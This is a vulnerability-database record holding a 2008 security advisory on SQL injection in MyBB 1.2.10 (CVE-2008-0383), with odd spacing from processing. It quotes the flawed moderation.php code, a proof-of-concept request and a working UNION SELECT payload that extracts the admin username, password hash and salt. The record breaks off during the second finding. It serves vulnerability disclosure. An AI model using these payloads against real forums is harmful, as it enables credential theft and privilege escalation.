{
    "text": "vul_name : Multiple Sql Injections in MyBB 1.2.10 ， vul_cve : CVE-2008-0383 ， vul_poc :  ，  [ waraxe-2008-SA # 062 ] - Multiple Sql Injections in MyBB 1.2.10 ， Author : Janek Vind \"waraxe\" ， Date : 16. January 2008 ， Location : Estonia , Tartu ， Web :  ， Target software description :  ， MyBB is a discussion board that has been around for a while ; it has evolved ， from other bulletin boards into the forum package it is today. Therefore ,  ， it is a professional and efficient discussion board , developed by an active ， team of developers. ， Vulnerabilities discovered ， 1. SQL Injection in \"moderation.php\" action \"do_mergeposts\" ， Precondition : attacker must have moderator privileges in target MyBB ， installation , including \"canmanagethreads\". ， From source code of \"moderation.php\" line ~ 438 :  ， / Lets merge those selected posts !  ， case \"do_mergeposts\" :  ， { ， error_no_permission (  )  ;  ， } ，  $ plugins->run_hooks ( \"moderation_do_mergeposts\" )  ;  ，  $ mergepost = $ mybb->input [ 'mergepost' ]  ;  ， { ， error (  $ lang->error_nomergeposts )  ;  ， } ， foreach (  $ mergepost as $ pid => $ yes )  ， { ，  $ plist [  ] = $ pid ;  ， } ，  $ moderation->merge_posts (  $ plist ,  $ tid ,  $ mybb->input [ 'sep' ]  )  ;  ， As seen above , unsanitized array variable 'mergepost' from GPC is delivered to ， function \"merge_posts (  ) \" as first argument - \" $ plist\". ， Source code of \"merge_posts\" :  ， { ， global $ db ,  $ plugins ;  ，  $ pidin = implode ( \" , \" ,  $ pids )  ;  ，  $ first = 1 ;  ， / Get the messages to be merged ，  $ query = $ db->query ( \" ， SELECT p.pid , p.uid , p.fid , p.tid , p.visible , p.message , f.usepostcounts ， FROM \".TABLE_PREFIX.\"posts p ， LEFT JOIN \".TABLE_PREFIX.\"forums f ON ( f.fid=p.fid )  ， WHERE p.tid=' $ tid' AND p.pid IN (  $ pidin )  ， ORDER BY dateline ASC ， \" )  ;  ， It is obvious , that \" $ pids\" argument will be used in sql query without any ， sanitization. So sql injection security hole seems to exist here. ， Let's try this proof of concept test :  ， &mergepost [ war ] =1&mergepost [ axe ] =2 ， . and we can see sql error message :  ， MySQL error : 1054 ， Unknown column 'war' in 'where clause' ， Query : SELECT p.pid , p.uid , p.fid , p.tid , p.visible , p.message , f.usepostcounts ， FROM mybb_posts p LEFT JOIN mybb_forums f ON ( f.fid=p.fid )  ， WHERE p.tid='0' AND p.pid IN ( war , axe ) ORDER BY dateline ASC ， Yes , indeed , sql injection exists and as bonus , we can determine from error ， message additional piece of information , useful for sql injections - ， table prefix. It can be different from \"mybb_\" and without knowing it we will ， have trouble trying to fetch data from MyBB tables. ， This was Proof-Of-Concept test , how about real attack example? ， Here it is :  ， &mergepost [ -1 ] =1&mergepost [ -2 ) UNION+ALL+SELECT+1 , 2 , 3 , 4 , 1 , 6 , 7+UNION+ALL+S ， ELECT+1 ,  ，  ( SELECT+CONCAT ( 0x5e , username , 0x5e , password , 0x5e , salt , 0x5e , 0x27 )  ， +FROM+mybb_users+LIMIT+0 , 1 )  , 3 , 4 , 1 , 6 , 7/ *  ] =2 ， As result we can see sql error message :  ， MySQL error : 1064 ， You have an error in your SQL syntax ; check the manual that corresponds to ， your MySQL server version for the right syntax to use near . line 1 ， Query : UPDATE mybb_users SET postnum=postnum-1 ， WHERE uid='^waraxe^aff3fcfc70d2a50c3d4c2158233c3901^C5ybEW6b^' ， Yeah - admin's username , password hash and salt , all in one line !  ， Now - mitigating factors. First of all , attacker must have moderator privileges ,  ， including \"canmanagethreads\". So this sql injection security hole can be ， used for privileges escalation from moderator to admin , if admin's password ， is weak enough to be cracked with reasonable processing power and time. ， Error feedback - if attacker can't see sql error messages , then this will not ， stop the attack , it will be just harder to exploit and involves blind sql ， injection attack methods. ， 2. SQL Injection in \"moderation.php\" action \"allreports\" ， Precondition : attacker must have moderator privileges in target MyBB ， installation.",
    "time": "2008.01.22"
}